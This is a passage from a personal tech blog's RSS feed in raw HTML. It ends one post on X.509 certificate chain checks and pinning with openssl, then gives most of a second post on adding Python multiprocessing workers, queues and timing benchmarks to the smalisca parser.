    g2 [label=<span style="color:#ed9d13">&#34;{Subject: google.com \l | Issuer: Google Internet Authority G2 \l }&#34;</span>, color=<span style="color:#ed9d13">&#34;grey&#34;</span>];
    google_site [label=<span style="color:#ed9d13">&#34;www.google.com \l&#34;</span>, color=<span style="color:#ed9d13">&#34;red&#34;</span>];
    
    root [width=<span style="color:#3677a9">2</span>, shape=<span style="color:#ed9d13">&#34;none&#34;</span>];
    leaf [width=<span style="color:#3677a9">2</span>, shape=<span style="color:#ed9d13">&#34;none&#34;</span>];
    
    equifax -&gt; geotrust;
    root -&gt; equifax [arrowsize=<span style="color:#3677a9">.5</span>, weight=<span style="color:#3677a9">2.</span>];
    geotrust -&gt; g2;
    g2 -&gt; google_site;
    leaf -&gt; google_site [arrowsize=<span style="color:#3677a9">.5</span>, weight=<span style="color:#3677a9">2.</span>];
    
    <span style="color:#3677a9">0</span> [shape=<span style="color:#ed9d13">&#34;none&#34;</span>, width=<span style="color:#3677a9">1</span>];
    <span style="color:#3677a9">1</span> [shape=<span style="color:#ed9d13">&#34;none&#34;</span>, width=<span style="color:#3677a9">1</span>];
    <span style="color:#3677a9">2</span> [shape=<span style="color:#ed9d13">&#34;none&#34;</span>, width=<span style="color:#3677a9">1</span>];
    
    {rank = same; root; equifax}
    {rank = same; g2, <span style="color:#3677a9">0</span>}
    {rank = same; geotrust, <span style="color:#3677a9">1</span>}
    {rank = same; leaf; google_site}
    
}
</code></pre></div><p><img src="/posts/img/2015/validating-and-pinning-x509-certificates/output_41_0.svg" alt="svg"></p>
<p>First of all you&rsquo;ll notice that there has been some problem regarding the validation:</p>
<pre><code>verify error:num=20:unable to get local issuer certificate
</code></pre>
<p>This has to do with the fact that <code>openssl</code> doesn&rsquo;t provide a list of trusted certs by default. You&rsquo;ll have to specify it manually:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash 
openssl s_client -showcerts -connect www.google.com:443 -CApath /etc/ssl/certs 2&gt; /dev/null | grep <span style="color:#ed9d13">&#34;Verify&#34;</span>
</code></pre></div><pre><code>    Verify return code: 0 (ok)
</code></pre>
<p>Ok, so that looks much better. Now let&rsquo;s <strong>verify</strong> the chain:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash 
openssl verify -CApath /etc/ssl/certs /tmp/pyopenssl/www.google.com.pem | grep <span style="color:#ed9d13">&#34;error&#34;</span>
</code></pre></div><pre><code>error 20 at 0 depth lookup:unable to get local issuer certificate
</code></pre>
<p>Hmm&hellip;Strange error message, even though I&rsquo;ve specified the path where to lookup the certs. Another try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt /tmp/pyopenssl/www.google.com.pem | grep <span style="color:#ed9d13">&#34;error&#34;</span>
</code></pre></div><pre><code>error 20 at 0 depth lookup:unable to get local issuer certificate
</code></pre>
<p>Strange! After some Googling, I&rsquo;ve found <a href="http://goobbe.com/questions/4022708/how-to-verify-certificate-chain-with-openssl">this</a>. So let&rsquo;s give it another try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>       -untrusted /tmp/pyopenssl/www.google.com.pem /tmp/pyopenssl/www.google.com.pem | grep <span style="color:#ed9d13">&#34;error&#34;</span>
</code></pre></div><pre><code>error 20 at 0 depth lookup:unable to get local issuer certificate
</code></pre>
<blockquote>
<p>If you have any ideas how to solve this, just drop me a line!</p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p><strong>Certificate pinning</strong> is a useful step towards authenticity verfication of a X.509 certificate. Keep in mind that <strong>MITM</strong> attacks are no rarity anymore and should be always be taken into consideration. Do <strong>not</strong> just validate the certificate. Make sure it is the one you&rsquo;ve been <strong>expecting</strong> while connecting to your site/SSL-backend. Use <strong>fingerprints</strong> (in general <strong>digests</strong>) which you can always compute on the <strong>presented</strong> information and compare it against an expected value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="http://www.artur-rodrigues.com/tech/2013/08/19/verifying-x509-signatures-in-python.html">Verifying x509 signatures in Python</a></li>
<li><a href="http://stackoverflow.com/questions/7689941/how-can-i-retrieve-the-tls-ssl-peer-certificate-of-a-remote-host-using-python">How can I retrieve the TLS/SSL peer certificate of a remote host using python?</a></li>
<li><a href="https://www.ietf.org/rfc/rfc3280.txt">Internet X.509 Public Key Infrastructure</a></li>
<li><a href="http://stackoverflow.com/questions/27599985/verify-errorcode-20-unable-to-get-local-issuer-certificate/27606964#27606964">Verify errorcode = 20 : unable to get local issuer certificate</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Adding concurrency to smalisca</title>
      <link>https://blog.dornea.nu/2015/05/06/adding-concurrency-to-smalisca/</link>
      <pubDate>Wed, 06 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/05/06/adding-concurrency-to-smalisca/</guid>
      <content:encoded><![CDATA[<p>When it comes to parallelism Python has some constraints which have to be taken into consideration
before starting coding. I think the biggest one has to do with the <a href="https://wiki.python.org/moin/GlobalInterpreterLock">Global Interpreter Lock</a> which prevents several threads from
executing Python bytecodes at once. Nevertheless you may want to apply <a href="http://en.wikipedia.org/wiki/Concurrency_pattern">concurrency patterns</a> to you code in order to achieve more speed. Besides that
you may want to use your cores properly otherwise you&rsquo;ll end up like this:</p>
<p><img src="https://pbs.twimg.com/media/CCjk6ySWYAIBrfc.jpg" alt="Parallelism in Action"></p>
<p>In my specific case I wanted to speed up the process of parsing files (as a major features of <a href="https://github.com/dorneanu/smalisca">smalisca</a>). I&rsquo;ve ended up looking at the <a href="https://docs.python.org/2/library/multiprocessing.html">muliprocessing</a> package which seemed quite promising:</p>
<blockquote>
<p>multiprocessing is a package that supports spawning processes using an API similar to the threading module. The multiprocessing package offers both local and remote concurrency, effectively side-stepping the Global Interpreter Lock by using subprocesses instead of threads. Due to this, the multiprocessing module allows the programmer to fully leverage multiple processors on a given machine. It runs on both Unix and Windows.</p>
</blockquote>
<p>In the next steps I&rsquo;ll try to document my beginners attempts at <strong>concurrency</strong> in Python.</p>
<h2 id="the-idea">The idea</h2>
<p>Using the <code>-l</code> (location) parameter you can specify the location path where <em>smalisca</em> should
lookup for files before parsing them and afterwards collecting valuable information. Looking closely
at the <a href="https://github.com/dorneanu/smalisca/blob/master/smalisca/modules/module_smali_parser.py#L134">code</a> I&rsquo;ve noticed that <code>os.walk</code> already returns a list of &ldquo;some important information about files and directories.&rdquo; The <code>multiprocessing</code> documentation refers to the <code>Pool</code> object:</p>
<blockquote>
<p>[&hellip;] is the Pool object which offers a convenient means of parallelizing the execution of a function across multiple input values, distributing the input data across processes (data parallelism).
[&hellip;]</p>
</blockquote>
<p>So I can:</p>
<ul>
<li><em>parallelize</em> the execution of a single function</li>
<li>use the <em>same input data</em> source for each thread/process</li>
<li><em>distribute</em> the input data across processes</li>
</ul>
<p>Ok, that sounds great!</p>
<h2 id="some-basic-code">Some basic code</h2>
<p>The basic idea is to &ldquo;walk&rdquo; through files and call a <em>function</em> for every single found file. You&rsquo;d usually start like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">for</span> root, dirs, files <span style="color:#6ab825;font-weight:bold">in</span> os.walk(location):
    <span style="color:#999;font-style:italic"># call here some function(s) to do whatever with the dirs/files</span>
</code></pre></div><p>But first an input filename list has to be generated:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_file_list</span>(folder):
    <span style="color:#ed9d13">&#34;&#34;&#34; Returns a list of files inside the &lt;folder&gt; directory &#34;&#34;&#34;</span>
    file_list = []

    <span style="color:#999;font-style:italic"># &#34;Walk&#34; through folder</span>
    <span style="color:#6ab825;font-weight:bold">for</span> root, dirs, files <span style="color:#6ab825;font-weight:bold">in</span> os.walk(folder):
        <span style="color:#6ab825;font-weight:bold">for</span> filename <span style="color:#6ab825;font-weight:bold">in</span> files:
            filepath = os.path.join(root, filename)

            <span style="color:#999;font-style:italic"># Check if it&#39;s file</span>
            <span style="color:#6ab825;font-weight:bold">if</span> os.path.isfile(filepath):
                file_list.append(filepath)

    <span style="color:#6ab825;font-weight:bold">return</span> file_list
</code></pre></div><p>In order to achieve concurrency the initial list has to be splitted into several sub-lists
which are then distributed to some &ldquo;workers&rdquo; (aka processes). The best way to do this is to
distribute the sub-lists equally to the number of available CPU cores. Given an initial
<code>file_list</code> one could do following:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cpu_cores = multiprocessing.cpu_count()
<span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, cpu_cores):
    sub_list = [file_list[j] <span style="color:#6ab825;font-weight:bold">for</span> j <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#24909d">len</span>(file_list)) <span style="color:#6ab825;font-weight:bold">if</span> j % cpu_cores == i]

    <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">len</span>(sub_list) &gt; <span style="color:#3677a9">0</span>:
        <span style="color:#999;font-style:italic"># Start new process with sub-list</span>
</code></pre></div><p>But wait a second&hellip; What should every process do? Well, the answer is quite obvious:
For every file in its sub-list, it has to call a certain function. Afterwards the process
has to somehow return the results to the parent process. But how is this done?</p>
<h2 id="communication-between-processes">Communication between processes</h2>
<p>A simple way is to use <code>Queue</code> where you can pass messages back and forth between your processes. In a more complicated example you might use <code>JoinableQueue</code> where you have typical consumer scenario: Processes fetch data, modify it and then push them back into the queue (<a href="http://en.wikipedia.org/wiki/Producer%E2%80%93consumer_problem">producer consumer pattern</a>).</p>
<p>In my case a <code>Queue</code> is perfectly fine. That way I have a safe way of letting the process pushing back the results into the queue, before merging all available results globally.
Let&rsquo;s have a look at some example:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">process_files</span>(file_list, q):
    <span style="color:#ed9d13">&#34;&#34;&#34; Proprocess every file in &lt;file_list&gt; and call parse_file() &#34;&#34;&#34;</span>
    results = []
    <span style="color:#6ab825;font-weight:bold">try</span>:
        <span style="color:#6ab825;font-weight:bold">for</span> f <span style="color:#6ab825;font-weight:bold">in</span> file_list:
            results.append(parse_file(f, <span style="color:#3677a9">3</span>))
    <span style="color:#6ab825;font-weight:bold">except</span>:
        q.put([])
        <span style="color:#6ab825;font-weight:bold">raise</span>

    <span style="color:#999;font-style:italic"># Put results into queue</span>
    q.put(results)
</code></pre></div><p><code>process_files</code> gets a file list (a sub-list from the big list) and a <em>queue</em>. After
<em>parsing</em> the files, the function will simply <code>put</code> the results into the queue. This
specific type of queue <em>should</em> be thread and process safe as the documentation states.</p>
<h2 id="collecting-results">Collecting results</h2>
<p>After all processes are done doing their job, it&rsquo;s time to collect the results:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">all_results = []
<span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#24909d">len</span>(procs)):
    all_results.append(q.get())
</code></pre></div><p><code>q</code> is the queue used by the processes. Just <code>get</code> all collected results and then you&rsquo;re
ready to go. You can found the whole code <a href="https://gist.github.com/dorneanu/2393d8d03d0ed443baeb">here</a>.</p>
<p>Ok, I&rsquo;ve shown some introductory example how to use <code>multiprocessing</code> properly by using
a very simplified code. Now let&rsquo;s move on to a more (or less) complicated scenrio:
Implement parallelism for <a href="https://github.com/dorneanu/smalisca">smalisca&rsquo;s</a> <a href="http://smalisca.readthedocs.org/en/latest/parsing.html#page-parsing">parsing</a> features.</p>
<h2 id="smalisca-and-parallelism">Smalisca and parallelism</h2>
<p>One of the slowest step within <em>smalisca</em> is parsing. And that&rsquo;s because every directory,
every file found within it, has to be parsed <em>sequentially</em>. Even from the beginning of
the development I&rsquo;ve thought <em>concurrency</em> would be a better choice to solve that. Due
to the priority of other main functionalities this never happened. Till now :)</p>
<p>As I&rsquo;m writing this text I also implement this new feature into <em>smalisca</em>. Before I&rsquo;ve
started with the coding part, I had to think about several things:</p>
<ol>
<li>Should concurrency be implemented as a <em>core</em> feature of the parsing component?</li>
<li>Regarding the sub-lists: Should I split <em>file</em> or <em>directory</em> lists?</li>
<li>How do I collect the results gained from the processes?</li>
<li>Will there be any major side-effects caused by the concurrency?</li>
</ol>
<p>Regarding <strong>1</strong>: Since I want to keep things simple and clean, I like the idea of a controller which <em>controls</em> the parser. <code>SmaliParser</code> should implement everything that has to do with the parsing itself, but the concurrency should be implemented on-top. That&rsquo;s why I&rsquo;ve
decided to parallelize several <code>SmaliParser</code> instances rather than creating processes inside it.</p>
<p>Regarding <strong>2</strong>: Due to the fact that the current directory path is used when creating new <code>class</code> objects, I&rsquo;ve decided to split the directory list, distribute the sub-lists equally across the <em>workers</em> and then collect the results.</p>
<p>Regarding <strong>3</strong>: The answer to this one should be quite obvious. One could use a <code>Queue</code> (a thread-safe one like <code>mutiprocessing.Queue</code>) and <code>put</code> the results of every worker
into it. Well that&rsquo;s pretty much what I&rsquo;ve done except for the fact that I&rsquo;ve used <strong>proxy</strong> objects instead of directly accessed ones. I&rsquo;ll come to this later one.</p>
<p>Regarding <strong>4</strong>: I couldn&rsquo;t notice any side-effects.</p>
<h2 id="the-basic-stuff">The basic stuff</h2>
<p>I didn&rsquo;t have to write a lot of code. In my case the concurrency has been implemented this way:</p>
<ul>
<li>for a given path location, <em>walk</em> the location and return lists of all found directories and files</li>
<li>split the big list into smaller sub-lists</li>
<li>every worker/process gets a sub-list</li>
<li>each worker initiates a <code>SmaliParser</code> instance for every directory in its sub-list</li>
<li>after <code>SmaliParser</code> finishes its work, the results are pushed into a thread-safe <code>Queue</code></li>
</ul>
<p>So basically you&rsquo;ll have a list of directory paths:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
    digraph G {
        graph [splines=curve, rankdir = LR, pad=&quot;.15&quot;, ranksep=&quot;1.25&quot;, nodesep=&quot;2.25&quot;];
        node[fontname=&quot;FreeSans&quot;,fontsize=&quot;14&quot;,shape=Mrecord,width=7, height=.5];

        compound = true;

        Bar[label=&quot;{\
              {PATHS \r |\
               &lt;p1&gt;/smali/com/android \l|\
               &lt;p2&gt;/smali/com/android/support \l|\
               &lt;p3&gt;/smali/com/gmail/framework \l|\
               &lt;p4&gt;/smali/com/gmail/calender/user \l|\
               &lt;p5&gt;/smali/de/bla/bla/ble \l |\
               &lt;pn&gt;... \l \
              }\
        }&quot;, width=8];
    }
}
</code></pre>

</details>

<p><img src="/posts/img/2015/smalisca-concurrency/paths.dot.png" alt="paths"></p>
<p>And some workers to do the job:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
    digraph G {
        graph [splines=curve, rankdir = LR, pad=&quot;.15&quot;, ranksep=&quot;1.25&quot;, nodesep=&quot;2.25&quot;];
        node[fontname=&quot;FreeSans&quot;,fontsize=&quot;14&quot;,shape=Mrecord,width=2, height=.5];

        compound = true;

        Workers[label=&quot;{\
              {WORKERS \r |\
               &lt;w1&gt;Worker #1 \l|\
               &lt;w2&gt;Worker #2 \l|\
               &lt;w3&gt;Worker #3 \l|\
               &lt;w4&gt;Worker #n \l\
              }\
        }&quot;, width=8];
    }
}
</code></pre>

</details>

<p><img src="/posts/img/2015/smalisca-concurrency/workers.dot.png" alt="workers"></p>
<p>In my case the paths have to be distributed to the workers:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
    digraph G {
        graph [splines=curve, rankdir = LR, pad=&quot;.15&quot;, ranksep=&quot;1.25&quot;, nodesep=&quot;2.25&quot;];
        node[fontname=&quot;FreeSans&quot;,fontsize=&quot;14&quot;,shape=Mrecord,width=2, height=.5];

        compound = true;

        Bar[label=&quot;{\
              {PATHS \r |\
               &lt;p1&gt;/smali/com/android \l|\
               &lt;p2&gt;/smali/com/android/support \l|\
               &lt;p3&gt;/smali/com/gmail/framework \l|\
               &lt;p4&gt;/smali/com/gmail/calender/user \l|\
               &lt;p5&gt;/smali/de/bla/bla/ble \l |\
               &lt;pn&gt;... \l \
              }\
        }&quot;, width=5];

        Workers[label=&quot;{\
              {WORKERS \r |\
               &lt;w1&gt;Worker #1 \l|\
               &lt;w2&gt;Worker #2 \l|\
               &lt;w3&gt;Worker #3 \l|\
               &lt;w4&gt;Worker #n \l\
              }\
        }&quot;, width=5];
        
        Bar:p1 -&gt; Workers:w1;
        Bar:p2 -&gt; Workers:w1;
        Bar:p3 -&gt; Workers:w2;
        Bar:p4 -&gt; Workers:w2;
        Bar:p5 -&gt; Workers:w2;
    }
}
</code></pre>

</details>

<p><img src="/posts/img/2015/smalisca-concurrency/paths-workers.dot.png" alt="paths-workers"></p>
<p>So let&rsquo;s continue with some code examples. A typical <strong>parser process</strong> would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">SmaliParserProcess</span>(multiprocessing.Process):
    <span style="color:#ed9d13">&#34;&#34;&#34;Implements a multiprocessing.Process
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">    Attributes:
</span><span style="color:#ed9d13">        dirs (list): List of directory paths
</span><span style="color:#ed9d13">        files (list): List of file paths
</span><span style="color:#ed9d13">    &#34;&#34;&#34;</span>

    <span style="color:#6ab825;font-weight:bold">def</span> __init__(self, dirs, suffix, result_queue):
        multiprocessing.Process.__init__(self)
        self.result_queue = result_queue
        self.dirs = dirs
        self.suffix = suffix

    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">run</span>(self):
        <span style="color:#ed9d13">&#34;&#34;&#34;Runs the process&#34;&#34;&#34;</span>
        c = <span style="color:#3677a9">0</span>
        <span style="color:#6ab825;font-weight:bold">for</span> d <span style="color:#6ab825;font-weight:bold">in</span> self.dirs:
            log.info(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">%s</span><span style="color:#ed9d13"> </span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">/</span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13"> Parsing </span><span style="color:#ed9d13">%s</span><span style="color:#ed9d13"> ... &#34;</span> % (self.name, c, <span style="color:#24909d">len</span>(self.dirs), d))

            <span style="color:#999;font-style:italic"># Parse directory</span>
            parser = SmaliParser(d, self.suffix)
            parser.run()

            <span style="color:#999;font-style:italic"># Get and save results</span>
            res = parser.get_results()
            self.result_queue.put(res)
            c += <span style="color:#3677a9">1</span>
</code></pre></div><p>A process will have a list of directories to scan plus a results queue where to put
its individual results.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    Graphviz code
    
  </summary>
  <pre><code>dot {
    digraph G {
        graph [splines=curve, rankdir = LR, pad=&quot;.15&quot;, ranksep=&quot;1.25&quot;, nodesep=&quot;2.25&quot;];
        node[fontname=&quot;FreeSans&quot;,fontsize=&quot;14&quot;,shape=Mrecord,width=2, height=.5];

        compound = true;

        Workers[label=&quot;{\
              {WORKERS \r |\
               &lt;w1&gt;Worker #1 \l|\
               &lt;w2&gt;Worker #2 \l|\
               &lt;w3&gt;Worker #3 \l|\
               &lt;w4&gt;Worker #n \l\
              }\
        }&quot;, width=4];

        Queue [label=&quot;Results Queue&quot;, shape=box3d, width=4];

        Workers:w1 -&gt; Queue;
        Workers:w2 -&gt; Queue;
        Workers:w3 -&gt; Queue;
        Workers:w4 -&gt; Queue;
    }
}
</code></pre>

</details>

<p><img src="/posts/img/2015/smalisca-concurrency/queue.dot.png" alt="queue"></p>
<p>A <strong>controller</strong> should create and create the workers. Afterwards it should collect the
results:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">ConcurrentParser</span>():
    <span style="color:#ed9d13">&#34;&#34;&#34;Implements concurrency features
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">    Attributes:
</span><span style="color:#ed9d13">        processes (list): List of processes/workers
</span><span style="color:#ed9d13">        result_queue (Queue): Proxy to some thread-safe queue
</span><span style="color:#ed9d13">    &#34;&#34;&#34;</span>

    <span style="color:#999;font-style:italic"># Use a manager to proxy access to the real queue</span>
    multimanager = multiprocessing.Manager()
    result_queue = multimanager.Queue()

    processes = []

    <span style="color:#6ab825;font-weight:bold">def</span> __init__(self, location, suffix, jobs):
        self.location = location
        self.suffix = suffix
        self.jobs = jobs

    <span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">run</span>(self):
        <span style="color:#ed9d13">&#34;&#34;&#34;Parallelize parsing
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">        Split input list into sublists according to the number of
</span><span style="color:#ed9d13">        specified jobs. Create new processes/workers and let them
</span><span style="color:#ed9d13">        do the parsing job.
</span><span style="color:#ed9d13">        &#34;&#34;&#34;</span>
        <span style="color:#999;font-style:italic"># Create sub-lists</span>
        <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, self.jobs):
            sub_list = [self.dirs[j] <span style="color:#6ab825;font-weight:bold">for</span> j <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">0</span>, <span style="color:#24909d">len</span>(self.dirs))
                        <span style="color:#6ab825;font-weight:bold">if</span> j % self.jobs == i]

            <span style="color:#999;font-style:italic"># Create new process</span>
            <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#24909d">len</span>(sub_list) &gt; <span style="color:#3677a9">0</span>:
                p = SmaliParserProcess(sub_list, self.suffix, self.result_queue)
                self.processes.append(p)

        <span style="color:#999;font-style:italic"># Start processes</span>
        <span style="color:#6ab825;font-weight:bold">for</span> p <span style="color:#6ab825;font-weight:bold">in</span> self.processes:
            p.start()

        <span style="color:#999;font-style:italic"># Exit the completed processes</span>
        <span style="color:#6ab825;font-weight:bold">for</span> p <span style="color:#6ab825;font-weight:bold">in</span> self.processes:
            p.join()

        <span style="color:#999;font-style:italic"># Get results</span>
        results = [self.result_queue.get() <span style="color:#6ab825;font-weight:bold">for</span> p <span style="color:#6ab825;font-weight:bold">in</span> self.processes]
</code></pre></div><p>Pretty straightforward, isn&rsquo;t it? Split the lists into sub-lists, assign each worker a sub-list and let them <em>run</em>. Then <em>join</em> the processes and collect the results.</p>
<h2 id="concurrency-caveats">Concurrency caveats</h2>
<p>In some initial code I&rsquo;ve had, I was using a simple <code>multiprocessing.Queue()</code> to collect
the results. After some testing I&rsquo;ve noticed that my processes never <strong>terminated</strong>.
Sometimes (in fact <strong>always</strong>) it&rsquo;s a good idea to take a closer look at the documentation.
Looking at the <a href="https://docs.python.org/3.1/library/multiprocessing.html#all-platforms">programming guidelines</a> I&rsquo;ve read following:</p>
<blockquote>
<p><strong>Joining processes that use queues</strong></p>
<p>Bear in mind that a process that has put items in a queue will wait before terminating until all the buffered items are fed by the â€œfeederâ€ thread to the underlying pipe. (The child process can call the Queue.cancel_join_thread() method of the queue to avoid this behaviour.)</p>
<p>Ã„ This means that whenever you use a queue you need to make sure that all items which have been put on the queue will eventually be removed before the process is joined. Otherwise you cannot be sure that processes which have put items on the queue will terminate. Remember also that non-daemonic processes will be automatically be joined.</p>
</blockquote>
<p>So my previous implementation was prone to a <strong>deadlock</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">...
queue = Queue()
p = Process(target=f, args=(queue,))
p.start()
p.join()                    <span style="color:#999;font-style:italic"># this deadlocks</span>
obj = queue.get() 
</code></pre></div><p>OK, leason lerned! And then I&rsquo;ve found this <a href="http://code.activestate.com/lists/python-tutor/99561/">post</a> which deals with <code>multiprocessing.Manager</code>s. In my current code I&rsquo;m also using a <code>Queue</code> but <strong>proxied</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">multimanager = multiprocessing.Manager()
result_queue = multimanager.Queue()
</code></pre></div><p>In this case <code>result_queue</code> is also a <code>Queue</code> wrapped by a proxy. As stated <a href="https://docs.python.org/3/library/multiprocessing.html#proxy-objects">here</a>:</p>
<blockquote>
<p>A proxy is an object which refers to a shared object which lives (presumably) in a different process. The shared object is said to be the referent of the proxy. Multiple proxy objects may have the same referent.
..
An important feature of proxy objects is that they are picklable so they can be passed between processes. Note, however, that if a proxy is sent to the corresponding managerâ€™s process then unpickling it will produce the referent itself.</p>
</blockquote>
<p>Ahhhh! Now that we&rsquo;ve implemented it (hopefully) the clean way, let&rsquo;s have a look at some metrics.</p>
<h2 id="metrics">Metrics</h2>
<p>Of course I wanted to somehow measure my improvements. Having that said don&rsquo;t expect <strong>huge</strong> improvements.
It kind of surprised me too. I&rsquo;ve compared the execution time (<strong>just for the parsing job</strong>) between</p>
<ul>
<li><strong>old</strong> and <strong>new</strong> version of smalisca</li>
<li>using different number of jobs/workers</li>
</ul>
<p>I&rsquo;ve used my Laptop (<strong>Dell XPS 13 with Intel Core i7</strong>) for the testings. Using a larger code repository (bigger than the <em>FakeBanker</em> one) I&rsquo;ve first ran the <strong>old</strong> smalisca version (0.1). This what I&rsquo;ve got:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">export</span> <span style="color:#40ffff">CMD</span>=<span style="color:#ed9d13">&#34;time smalisca parser -l /home/victor/work/Projects/XXX/source/smali -s java -f sqlite  -o ~/work/Projects/XXXX/db.sqlite&#34;</span>
$ <span style="color:#6ab825;font-weight:bold">for</span> i in {1..10};<span style="color:#6ab825;font-weight:bold">do</span> <span style="color:#24909d">eval</span> <span style="color:#ed9d13">${</span><span style="color:#40ffff">CMD</span><span style="color:#ed9d13">}</span> | grep total; <span style="color:#6ab825;font-weight:bold">done</span> 
smalisca parser -l  -s java -f sqlite -o   3.61s user 0.11s system 100% cpu 3.712 total
smalisca parser -l  -s java -f sqlite -o   3.66s user 0.12s system 100% cpu 3.778 total
smalisca parser -l  -s java -f sqlite -o   3.66s user 0.10s system 100% cpu 3.762 total
smalisca parser -l  -s java -f sqlite -o   3.64s user 0.11s system 100% cpu 3.748 total
smalisca parser -l  -s java -f sqlite -o   3.67s user 0.18s system 100% cpu 3.853 total
smalisca parser -l  -s java -f sqlite -o   3.56s user 0.13s system 100% cpu 3.689 total
smalisca parser -l  -s java -f sqlite -o   3.55s user 0.11s system 100% cpu 3.663 total
smalisca parser -l  -s java -f sqlite -o   3.63s user 0.12s system 100% cpu 3.746 total
smalisca parser -l  -s java -f sqlite -o   3.52s user 0.16s system 100% cpu 3.681 total
smalisca parser -l  -s java -f sqlite -o   3.55s user 0.11s system 100% cpu 3.658 total
</code></pre></div><p>As you see it takes ca. <strong>3.5 seconds</strong> to finish the parsing. OK, now what about the
<strong>concurrent</strong> version of smalisca?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#24909d">export</span> <span style="color:#40ffff">CMD</span>=<span style="color:#ed9d13">&#34;time ./smalisca-test.py parser --depth 2 -l /home/victor/work/Projects/XXX/source/smali -s java -f sqlite  -o ~/work/Projects/XXXX/db.sqlite&#34;</span>
$ <span style="color:#6ab825;font-weight:bold">for</span> i in {1..10};<span style="color:#6ab825;font-weight:bold">do</span> <span style="color:#24909d">eval</span> <span style="color:#ed9d13">${</span><span style="color:#40ffff">CMD</span><span style="color:#ed9d13">}</span> 2&gt;&amp;<span style="color:#3677a9">1</span> /dev/null | grep total; <span style="color:#6ab825;font-weight:bold">done</span> 
./smalisca-test.py parser --depth <span style="color:#3677a9">2</span> -l  -s java -f sqlite -o   5.52s user 0.28s system 156% cpu 3.704 total
